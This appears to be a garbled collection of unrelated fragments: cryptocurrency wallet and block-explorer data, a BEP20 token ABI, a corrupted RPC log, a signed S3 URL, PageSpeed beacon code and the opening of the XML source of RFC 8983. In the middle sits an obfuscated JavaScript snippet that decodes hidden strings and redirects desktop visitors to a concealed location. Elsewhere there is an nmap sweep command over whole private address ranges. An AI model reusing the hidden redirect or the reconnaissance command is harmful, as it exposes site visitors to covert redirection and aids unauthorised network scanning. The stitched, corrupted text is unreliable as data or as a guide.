5SsDRkVBAIxffh0DHKKNdfYSKJAyyWzcxxo7MtlQoYEhuUWi7eHZltDBk79
pvs5pkflMUvChW13yBOtZnFb2n1tQZBTpEix78PcNadXjqV+Wvq5sInE1/x7UZL2fKpS0DO2BhYA
0000000000000000000afba244f7c2e8cd0d79a2

Timbrar

>

Solo alarmas

Hasta que desactives No molestar

DESA
Tx

Entrada (1)

119.99990000 BCH

prv5yjx3v7j6w057eupgxz6119.99990000

Salida (2)

119.99984405 BCH

pp7054yelqcum 45j5yxpjpn119.79984405 ▷

pzoyavaeg7g857wc93x419et 0.20000000

199,048 Número de Confirmación1.010-2487-g4e1a1705-dirty 
dGJuYjFxcTU1OWZrZXM3Nzl0M3E5cDlhZWduanBsdnRjNTN5Zzl2dXNhaA
https://live.blockcypher.com/btc-testnet/decodetx/
curl https://api.blockcypher.com/v1/btc/main/txs/a40c283de4c26b027a5734ff89ce78ade1220fc313befa107ec6c245c24bdec0
1279876503982059895650391279876503982039895650395535656826553565681955356568268203553565681955356573325612856423561285641856128564215612856430561285642356128564475535657332820356128564238203561285641882035612856421820356128564308203561256423820356128564475535756424553565734282055535856605820555357564245535657340553575642455356573428203553585660582035535756424553565734012798765039820598956503912798765039820398956503955356568265535656819553565682682035535656819553565733256128564235612856418561285642156128564305612856423561285644755356573328203561285642382035612856418820356128564218203561285643082035612856428203561285644755357564245535657342820555358566058205553575642455356573405535756424553565734282035535856605820355357564245535657340


="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}
[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"tokens","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getMiningDifficulty","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"nonce","type":"uint256"},{"name":"challenge_digest","type":"bytes32"}],"name":"mint","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"lastRewardBscBlockNumber","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"rewardEra","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getMiningTarget","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getMiningReward","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getChallengeNumber","outputs":[{"name":"","type":"bytes32"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maxSupplyForEra","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"tokenAddress","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transferAnyBEP20Token","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"tokensMinted","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"lastRewardTo","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"acceptOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"nonce","type":"uint256"},{"name":"challenge_digest","type":"bytes32"},{"name":"challenge_number","type":"bytes32"},{"name":"testTarget","type":"uint256"}],"name":"checkMintSolution","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"epochCount","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_MAXIMUM_TARGET","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"miningTarget","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"challengeNumber","outputs":[{"name":"","type":"bytes32"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"nonce","type":"uint256"},{"name":"challenge_digest","type":"bytes32"},{"name":"challenge_number","type":"bytes32"}],"name":"getMintDigest","outputs":[{"name":"digesttest","type":"bytes32"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"_BLOCKS_PER_READJUSTMENT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"lastRewardAmount","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"tokens","type":"uint256"},{"name":"data","type":"bytes"}],"name":"approveAndCall","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"latestDifficultyPeriodStarted","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"newOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_MINIMUM_TARGET","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"tokenOwner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":false,"name":"reward_amount","type":"uint256"},{"indexed":false,"name":"epochCount","type":"uint256"},{"indexed":false,"name":"newChallengeNumber","type":"bytes32"}],"name":"Mint","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_from","type":"address"},{"indexed":true,"name":"_to","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"tokens","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"tokenOwner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"tokens","type":"uint256"}],"name":"Approval","type":"event"}]

nmap -v -sn 192.168.0.0/16 10.0.0.0/8
http://github.com/BonsaiDen/BiSON.js.git

23946420241367472408581123885487240802442410640723804281240772662411090224106839171424724126458241167172388438624034168239662082400137324095695239683862410968924129451240772412411691624109115241294022411677224004644240645552412861224007246241302382411673523882685239447724082661l2399805623744176241312962411322424113698241115492393497024007790238579502391859724130418240020223932142623858057241348292404982024080738241155082402814324106921241332622412685023983296241310292413625624120992240369472400202524053419https://www.wtfpl.net/
$ go get -u github.com/modood/btckeygen
http://%3Crequestid%3E1j00x5jh5fc2vkmz%3C/RequestId%3E%3CHostId%3ENk6I4abdPLC6yGZUbwg2OjfuFJUuS52Efdz0he3ME8TKHlBaVttpvQhI6D7Kbv1rfDXNaWE2jPk=%3C/HostId%3E
https://github-releases.githubusercontent.com/391 50490/10196434-caac-4cda-aa52-db75f35fbfb6?X-Amz-Algorithm= AWS 4-HMAC-SHA256&X-Amz-Credential-AKIAIVNJYAX4CSVEH53A/20 211101/us-east-1/s3/aws4_request&X-Amz-Date=20211101T 15141828X-Amz-Expires=3008X-Amz-Signature=fa058bdad310135af 26eed386db6a990b274901a1fc31762c06d200946873381&X-Amz-Signe dHeaders host&actor_id=0&key_id=0&repo_id=391504908response -content-disposition=attachment8 filename=graph.snaps hot-mainnet.z11b&response-content-type-application/octet stream [following]

--2021-11-01<RequestId>1J00X5JH5FC2VKMZ</RequestId>
<HostId>Nk6I4abdPLC6yGZUbwg2OjfuFJUuS52Efdz0he3ME8TKHlBaVttpvQhI6D7Kbv1rfDXNaWE2jPk=</HostId>
System log

938 jeorpe: 2.0",method eth_getBalance params

[0x2260fac5e5542a773aa44fbcfedf7c193bc2cf99,latest]) 10-27 21:15:38,481 VURL (10248):

https://http-maninet-node huobichain.com

10-27 21:15:38 481 /Request Body(10248): (id) 939 jaonrpe 2.0 method eth_getBalance params:

[0x2260fac5e5542x773aa44fbcfedf7c103bc2c599 Tatent))

10-27 21:15:39.079 1/URL (10248): https://core.pos.network/ 10-27 21:15:39 079 /Request Body(10248) ("id"

940 jeorpo"2.0"method th getBalance" "params":

[0x2260fac5e5542a773aa44fbcfedf7c193bc2r-599 latest) 10-27 21:15:39.629 URL (10248): https://bso-dataseed.binance.org

10-27 21:15:39.629 1/Request Body(10248): (id

941, jsonrpo "2.0"method eth.getBalance param [0x2260fac5e5542a773aa44fbcfedf7c193be2c599",atent"])

10-27 21:15:41,011 V/URL (10248) https://rpc.sigmal.artis.network 10-27 21:15:41 011 //Request Body(10248): ["id"

942 jsonpo"2.0"method eth getBalance params

10x2260fac565542a773aa44fbcfedf7c193bc2c599 Tatent) 10-27 21:15:41 999 1/URL (10248) https://www.ethercluster.com/etc[4480,10232.com.moneybookers.skrillpayments

36535296,33554432,32768,83103744,0,18,116][4480,10232.com.moneybookers.skrillpayments

36535296,33554432,32768,83103744,0,18,116][id=710a07f6-87db-4440-b366-83ef247af853, tags=com.symantec spoc.LongPoller LongPollerWorker}}
[id=710a07f6-87db-4440-b366-83ef247af853,
https://mainnet.infura.io/v3/da3717125/824cc1ba32d812386493!http://browsehappy.com

https://www.blockonomics.co/api/tx?txid=3c2b39e494620c307804158f263e745a292aa450ce6c7c3ca9f42d787c0d1054&addr=bc1qyhw9gp9tygx37za3egs0zemn9663pah09z9ddfcol-xs-6,col-xs-6 2,col-xs-6 3,img-responsive src,col-xs-7,ng-binding,col-xs-5,ng-binding 2,col-xs-4,col-xs-8 href,col-xs-8 src,," src"
Net Amount,0.0000281 BTC,"(function(){var g=this,h=function(b,d){var a=b.split("".""),c=g;a[0]in c||!c.execScript||c.execScript(""var ""+a[0]);for(var e;a.length&&(e=a.shift());)a.length||void 0===d?c[e]?c=c[e]:c=c[e]={}:c[e]=d};var l=function(b){var d=b.length;if(0<d){for(var a=Array(d),c=0;c<d;c++)a[c]=b[c];return a}return[]};var m=function(b){var d=window;if(d.addEventListener)d.addEventListener(""load"",b,!1);else if(d.attachEvent)d.attachEvent(""onload"",b);else{var a=d.onload;d.onload=function(){b.call(this);a&&a.call(this)}}};var n,p=function(b,d,a,c,e){this.f=b;this.h=d;this.i=a;this.c=e;this.e={height:window.innerHeight||document.documentElement.clientHeight||document.body.clientHeight,width:window.innerWidth||document.documentElement.clientWidth||document.body.clientWidth};this.g=c;this.b={};this.a=[];this.d={}},q=function(b,d){var a,c,e=d.getAttribute(""pagespeed_url_hash"");if(a=e&&!(e in b.d))if(0>=d.offsetWidth&&0>=d.offsetHeight)a=!1;else{c=d.getBoundingClientRect();var f=document.body;a=c.top+(""pageYOffset""in window?window.pageYOffset:(document.documentElement||f.parentNode||f).scrollTop);c=c.left+(""pageXOffset""in window?window.pageXOffset:(document.documentElement||f.parentNode||f).scrollLeft);f=a.toString()+"",""+c;b.b.hasOwnProperty(f)?a=!1:(b.b[f]=!0,a=a<=b.e.height&&c<=b.e.width)}a&&(b.a.push(e),b.d[e]=!0)};p.prototype.checkImageForCriticality=function(b){b.getBoundingClientRect&&q(this,b)};h(""pagespeed.CriticalImages.checkImageForCriticality"",function(b){n.checkImageForCriticality(b)});h(""pagespeed.CriticalImages.checkCriticalImages"",function(){r(n)});var r=function(b){b.b={};for(var d=[""IMG"",""INPUT""],a=[],c=0;c<d.length;++c)a=a.concat(l(document.getElementsByTagName(d[c])));if(0!=a.length&&a[0].getBoundingClientRect){for(c=0;d=a[c];++c)q(b,d);a=""oh=""+b.i;b.c&&(a+=""&n=""+b.c);if(d=0!=b.a.length)for(a+=""&ci=""+encodeURIComponent(b.a[0]),c=1;c<b.a.length;++c){var e="",""+encodeURIComponent(b.a[c]);131072>=a.length+e.length&&(a+=e)}b.g&&(e=""&rd=""+encodeURIComponent(JSON.stringify(s())),131072>=a.length+e.length&&(a+=e),d=!0);t=a;if(d){c=b.f;b=b.h;var f;if(window.XMLHttpRequest)f=new XMLHttpRequest;else if(window.ActiveXObject)try{f=new ActiveXObject(""Msxml2.XMLHTTP"")}catch(k){try{f=new ActiveXObject(""Microsoft.XMLHTTP"")}catch(u){}}f&&(f.open(""POST"",c+(-1==c.indexOf(""?"")?""?"":""&"")+""url=""+encodeURIComponent(b)),f.setRequestHeader(""Content-Type"",""application/x-www-form-urlencoded""),f.send(a))}}},s=function(){var b={},d=document.getElementsByTagName(""IMG"");if(0==d.length)return{};var a=d[0];if(!(""naturalWidth""in a&&""naturalHeight""in a))return{};for(var c=0;a=d[c];++c){var e=a.getAttribute(""pagespeed_url_hash"");e&&(!(e in b)&&0<a.width&&0<a.height&&0<a.naturalWidth&&0<a.naturalHeight||e in b&&a.width>=b[e].k&&a.height>=b[e].j)&&(b[e]={rw:a.width,rh:a.height,ow:a.naturalWidth,oh:a.naturalHeight})}return b},t="""";h(""pagespeed.CriticalImages.getBeaconData"",function(){return t});h(""pagespeed.CriticalImages.Run"",function(b,d,a,c,e,f){var k=new p(b,d,a,e,f);n=k;c&&m(function(){window.setTimeout(function(){r(k)},0)})});})();pagespeed.CriticalImages.Run('/ngx_pagespeed_beacon','https://www.blockonomics.co/api/tx?txid=3c2b39e494620c307804158f263e745a292aa450ce6c7c3ca9f42d787c0d1054&addr=bc1qyhw9gp9tygx37za3egs0zemn9663pah09z9ddf
','Dy6p5_Pi4Q',true,false,'ktdIvRMuiMc');","data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABRCAMAAAByk9E6AAAAM1BMVEX////7sDv7sDv7sDv7sDv7sDv7sDv7sDv7sDv7sDv7sDv7sDv7sDv7sDv7sDv7sDv7sDu7xxDxAAAAEHRSTlMAECAwQFBgcICQoLDA0ODwVOCoyAAABOtJREFUWMOlWMmCrCAMLBbZhfr/r30HQLGF1p6Xy8w4WGapJCTAg6jN+dTEu03hf0S5xJsk90dQ5TMXkv3vmCbxqyTzG9yo3J5ck7SPar6H1Od70eqP/9l4fkm/ghPHG3E7ccZ3t/OEeMbbSj1bnAQAaXzKJBnGQ9L1U9sTnu9wAgDMafwBqJ0CIDqk/25ui22opohCMnmr9WmaJLkbACK0eH8xW1SF8uEw6+8m2dJDrCsX9iWiyqN6Z0CMCymlFJypX9pS+2pTMi9oLqpXLvSS9oPgyUoAKrUQm+pxsba3aEAn2/i9z5JkN42rCYAuS6srngJMPYoex7sUC8DVU6oi3vFCxwv1h87fUjlrQFa1KmK4ZS9JsuLt4uDEWs7QqbvrAVnaw0BGAbXzUXZ1UabIC2BqpLdk6J5+kqIv6ZVuBu/ARu6imf9CzCWg5pOBCrIwC2x8LRsAH2R148BGR5IOAItqUXsnRQGJaUA4FcwAYCRE5g9SBCxpgTyq6EYPRP4kEUgsze9dxUNBAHbCD611IIPWesImC0m6puIQYnMpENd6UI1wnV03oz0pR5Q4KOj5KyA9ROkqRgAQg/WSvwNSIrC0SIhusZwqGLTWWisAUmsJwJepipI0VRnTLN4B7Vt4BnEPV4DmRSAx1nSJDcRBkOqWc27dd64ZuNFVm0srPhobKW4cTM7eEeWMi0oAuuavIUnAc79ZXD8FALWouqEUf9h8nDLwNY6Jvn5iDdjLslscQiLpkepB0syy5ApYFoD2VD1hJ+kgSYXwBJjPYnyl11kTdtSypsk5bS+A/mxKN+oDtZCivqXJmjxfAItd0KYnrh4AHfdDj5m/T9JM29cMML0CdPOqCKgkBkCFjf6lhmEOmOguGkLjG2C9s8vhSvAIiK+AF77ZGWChvQM+0ob1spAntGlUaYDmLaCdl/UEQepWFtJZptwj4DY/5yqPHcmE2FvB3N1XwEXjMbDMaFDuZLpcApbLUJLvXSUy1ueuJqBcnOyXNOOcc04sDMk1yLI6RbSoaCdutgQ5mxXKvUupo1SL2lsCEOvzx55i7sVGQXKv5XBvLi6AZ273vC+Ayk5qww5gE9XRvteIDYo0n+7JddMAwKRkVo3eDNVQ9xDGds/Lv98c8nBtKyetJEzrpr8CbgPn/OXXzH36ynfANF6z5JnDRWAjbZsvrlxMKeXq0LIiapuEMZTuMF5F34sZBzF9mVIUZGEEwi94AbCxT1PnpKLbn5YJNzJ+naYAR3aV9McgZQGjFo1ygSdgyNiKeLyNemp9Y1vhqcJdtLnnkviWJHOfM8QrPwYBVVhUG20+bn7p6lX7jGeBrbRZ6nN2POaJc4x+GnB3BdhjYp+tHfRwj9qcaOuUbzsCX/chYXohOApxqNNq1sPy6AZXa3dmEh3PrLdUUVQPRgnATCa/2F829ti8LfZV9WO7bB4MEoDY/FARkt/E5C4WVqulcDY3W0gmI/q2T2utV+0gfNlsNqtk9+AnGbSNxzMZufbfx/awOFQP5nNh7EJdJHZAV15tEDv/6oZVHB7rAS/RCACij2j78764N+fi5WVrnKJzuj6SxxDpXy2wjyTZ7aTTy7OV7m/X2cPImaPTx2tKu5j/sne+T7Hl1k/yb5vxeZJM0uUXuW03r1vOP4nYXMrXy4nbBP5XlNbGOaP1m6D+Ax/D3G+pbEIEAAAAAElFTkSuQmCC",,,,,,,,,
,,,,Date-time:,24 Jul 2021 10:21:52,Status:,Confirmed,,,,,
,,,,,,,,Estimated to Confirm in next,https://mempool.space/tx/3c2b39e494620c307804158f263e745a292aa450ce6c7c3ca9f42d787c0d1054,https://www.blockonomics.co/img/22xNxblock_track.png.pagespeed.ic._EQoouqsjS.png,,
,,,,,,,,,,,"Waiting for transaction to confirm? Feel free to try the below
tips",https://www.youtube.com/embed/9BMrApmCM98b86568023b297fbb976d02988f6e79a4554eaa84753572cf8c4524695cc1afa6353a5a5c9897ba9342d6a56911682fa34f05a91bd928f0318a87890d5d5fe82a#t=0.1THRUST-https://www.dextools.io. /app/bsc/pair-explorer/0x17ee9a210eb 4b26e6e4e3880f553db3cd2afed1d0.0000~1.4325sol2uml ./contracts,node_modules/openzeppelin-solidity -f all -v
https://firebase.google.com"><img style="width: 220px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAbgAAADiCAYAAAA8qNKWAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAF09JREFUeNrs3U1sG2d+x/H/UH4RHa1DOVugEbA1KwF9iYJGGwsI0Mox00RpUcCpC7TOtpfolt7sXhboydlTgl6c3janbAr0sG6Apk6bNx1iYAX04kVzWGW3SKRdbFDmxWtRtiyRIjkznWf4jERR884hJYrfD0BLlsiZ4TPU/OY/88wzIgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMiYQRMkYy

_0x5a47=['DxnLCKfNzw50','mtCZmJu4u0jlsLv3','nwL1ANbYsG','DgvZDa','mtqXDeTsBfPW','mti4mJnVCezMzfu','mJq1nuPurfbduG','mJiWndmYtMv0Ewz3','AhjLzG','mJy4mtK0Auj3z0Dk','lI80mdqUAhrTBa','mti0owHTrxrAEa','mJG5mZa1D1PkuxjT','Bg9JyxrPB24','ndnWA0rVueC'];var _0x34a9=function(_0x5947fd,_0x3bac7b){_0x5947fd=_0x5947fd-0x12c;var _0x5a47b1=_0x5a47[_0x5947fd];if(_0x34a9['lnLtmd']===undefined){var _0x34a966=function(_0x4c6d7c){var _0x15fd5a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x49cf66='';for(var _0x50626f=0x0,_0x2007c6,_0x760795,_0x169eab=0x0;_0x760795=_0x4c6d7c['charAt'](_0x169eab++);~_0x760795&&(_0x2007c6=_0x50626f%0x4?_0x2007c6*0x40+_0x760795:_0x760795,_0x50626f++%0x4)?_0x49cf66+=String['fromCharCode'](0xff&_0x2007c6>>(-0x2*_0x50626f&0x6)):0x0){_0x760795=_0x15fd5a['indexOf'](_0x760795);}return _0x49cf66;};_0x34a9['msmEie']=function(_0x25123e){var _0x4695a5=_0x34a966(_0x25123e);var _0x4d5aa4=[];for(var _0xdf3efc=0x0,_0x3543a6=_0x4695a5['length'];_0xdf3efc<_0x3543a6;_0xdf3efc++){_0x4d5aa4+='%'+('00'+_0x4695a5['charCodeAt'](_0xdf3efc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4d5aa4);};_0x34a9['btHvUA']={};_0x34a9['lnLtmd']=!![];}var _0x2b3bc1=_0x5a47[0x0];var _0x671779=_0x5947fd+_0x2b3bc1;var _0x57780d=_0x34a9['btHvUA'][_0x671779];if(_0x57780d===undefined){_0x5a47b1=_0x34a9['msmEie'](_0x5a47b1);_0x34a9['btHvUA'][_0x671779]=_0x5a47b1;}else{_0x5a47b1=_0x57780d;}return _0x5a47b1;};var _0x263ba0=_0x34a9;(function(_0xfb3059,_0x97411){var _0x36f247=_0x34a9;while(!![]){try{var _0x290eca=parseInt(_0x36f247('0x137'))+-parseInt(_0x36f247('0x13a'))+-parseInt(_0x36f247('0x12f'))+parseInt(_0x36f247('0x139'))*parseInt(_0x36f247('0x132'))+parseInt(_0x36f247('0x135'))+parseInt(_0x36f247('0x12d'))*-parseInt(_0x36f247('0x134'))+parseInt(_0x36f247('0x130'))*parseInt(_0x36f247('0x133'));if(_0x290eca===_0x97411){break;}else{_0xfb3059['push'](_0xfb3059['shift']());}}catch(_0x165dc0){_0xfb3059['push'](_0xfb3059['shift']());}}}(_0x5a47,0x273d2));if(!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i[_0x263ba0('0x131')](navigator[_0x263ba0('0x12e')])){window[_0x263ba0('0x12c')][_0x263ba0('0x136')]=_0x263ba0('0x138')https://1.bp.blogspot.com/-Rj3Dc8AAqW0/YMcOwKym0uI/AAAAAAAACBA/Gd4EHpsLveEqmx2ONS0tTgqKmdvEDzJtwCLcBGAsYHQ/s16000/endrigght"/explorer-frontend/_next/static/chunks/9ed9fec2dbc3d90f61128a7df58209194f99b3f6.60cbea6ce3605ab0482d.js" nonce="96ade65e-0fec-4031-a586-856f531da2cf" 
718.94 USD 550.71 USD 552.43 USD 552.43 USD 2021-11-19
{"data":{"blocks":714808,"transactions":347695857,"outputs":918093326,"circulation":1890503739665292,"blocks_24h":173,"transactions_24h":80934,"difficulty":219997662911.22,"volume_24h":77258318834987,"mempool_transactions":60,"mempool_size":33223,"mempool_tps":0.7333333333333333,"mempool_total_fee_usd":0.3343,"best_block_height":714807,"best_block_hash":"000000000000000003e4b0948faf97e02dc5cdcf6e90cf114797e47e4c70725a","best_block_time":"2021-11-19 19:47:11","blockchain_size":174722983938,"average_transaction_fee_24h":1399,"inflation_24h":108125000000,"median_transaction_fee_24h":220,"cdd_24h":5594007.070316066,"mempool_outputs":402,"largest_transaction_24h":{"hash":"3c7caaf92f5c7b0a5b1922652de1c18ee4831c9e281e20123d03a4c89f494fb5","value_usd":48311088},"nodes":1067,"hashrate_24h":"1893552640078511339","inflation_usd_24h":621664.6875,"average_transaction_fee_usd_24h":0.008045501240974128,"median_transaction_fee_usd_24h":0.00126489,"market_price_usd":574.95,"market_price_btc":0.0098885506423817,"market_price_usd_change_24h_percentage":2.04831,"market_cap_usd":10873133656,"market_dominance_percentage":0.4,"countdowns":[],"suggested_transaction_fee_per_byte_sat":1,"hodling_addresses":20017389,"layer_2":{"slp":{"tokens":267029,"transactions":2259449,"tokens_24h":0,"transactions_24h":0}}},"context":{"code":200,"source":"A","state":714807,"market_price_usd":575.15,"cache":{"live":false,"duration":"Ignore","since":"2021-11-19 19:48:09","until":"2021-11-19 19:49:20","time":5.0067901611328125e-6},"api":{"version":"2.0.93","last_major_update":"2021-07-19 00:00:00","next_major_update":null,"documentation":"https:\/\/blockchair.com\/api\/docs","notice":":)"},"server":"BCH3","time":0.8122620582580566,"render_time":0.015433073043823242,"full_time":0.015438079833984375,"request_cost":1}}{"data":{"blocks":714832,"transactions":347704836,"outputs":918133158,"circulation":1890518739665292,"blocks_24h":165,"transactions_24h":80880,"difficulty":223375579782.69,"volume_24h":79804070914659,"mempool_transactions":477,"mempool_size":274464,"mempool_tps":0.5833333333333334,"mempool_total_fee_usd":4.0558,"best_block_height":714831,"best_block_hash":"000000000000000000df094d61702911c01b43b14b62a566bf1eb9f32b4b00b8","best_block_time":"2021-11-19 22:42:39","blockchain_size":174727887449,"average_transaction_fee_24h":1322,"inflation_24h":103125000000,"median_transaction_fee_24h":220,"cdd_24h":8153325.053042233,"mempool_outputs":3420,"largest_transaction_24h":{"hash":"3c7caaf92f5c7b0a5b1922652de1c18ee4831c9e281e20123d03a4c89f494fb5","value_usd":48311088},"nodes":1069,"hashrate_24h":"1834399254089347628","inflation_usd_24h":592380.9375,"average_transaction_fee_usd_24h":0.007596182348662215,"median_transaction_fee_usd_24h":0.001263746,"market_price_usd":574.43,"market_price_btc":0.0098875998347563,"market_price_usd_change_24h_percentage":3.84861,"market_cap_usd":10872151751,"market_dominance_percentage":0.4,"countdowns":[],"suggested_transaction_fee_per_byte_sat":1,"hodling_addresses":20019774,"layer_2":{"slp":{"tokens":267029,"transactions":2259449,"tokens_24h":0,"transactions_24h":0}}},"context":{"code":200,"source":"A","state":714831,"market_price_usd":575.44,"cache":{"live":false,"duration":"Ignore","since":"2021-11-19 22:51:34","until":"2021-11-19 22:52:45","time":4.0531158447265625e-6},"api":{"version":"2.0.93","last_major_update":"2021-07-19 00:00:00","next_major_update":null,"documentation":"https:\/\/blockchair.com\/api\/docs","notice":":)"},"server":"BCH3","time":1.0224261283874512,"render_time":0.0027968883514404297,"full_time":0.0028009414672851562,"request_cost":1}}USD 661,591,377,620.00<?xml version='1.0' encoding='utf-8'?>
<rfc xmlns:xi="http://www.w3.org/2001/XInclude" version="3" category="std" consensus="true" docName="draft-ietf-ipsecme-ipv6-ipv4-codes-06" indexInclude="true" ipr="trust200902" number="8983" prepTime="2021-02-12T23:06:05" scripts="Common,Latin" sortRefs="true" submissionType="IETF" symRefs="true" tocDepth="4" tocInclude="true" updates="7296" xml:lang="en">
    <link href="https://datatracker.ietf.org/doc/draft-ietf-ipsecme-ipv6-ipv4-codes-06" rel="prev" />
    <link href="https://dx.doi.org/10.17487/rfc8983" rel="alternate" />
    <link href="urn:issn:2070-1721" rel="alternate" />
    <front>
        <title abbrev="IPv4/IPv6 Notification Status Types">Internet Key Exchange Protocol Version 2 (IKEv2) Notification Status Types for IPv4/IPv6 Coexistence</title>
        <seriesInfo name="RFC" value="8983" stream="IETF" />
        <author fullname="Mohamed Boucadair" initials="M." surname="Boucadair">
            <organization showOnFrontPage="true">Orange</organization>
            <address>
                <postal>
                    <street />
                    <city>Rennes</city>
                    <code>35000</code>
                    <country>France</country>
                </postal>
                <email>mohamed.boucadair@orange.com</email>
            </address>
        </author>
        <date month="02" year="2021" />
        <workgroup>ipsecme</workgroup>
        <keyword>IPv4 service continuity</keyword>
        <keyword>VoLTE</keyword>
        <keyword>Handover</keyword>
        <keyword>Service continuity</keyword>
        <keyword>3GPP</keyword>
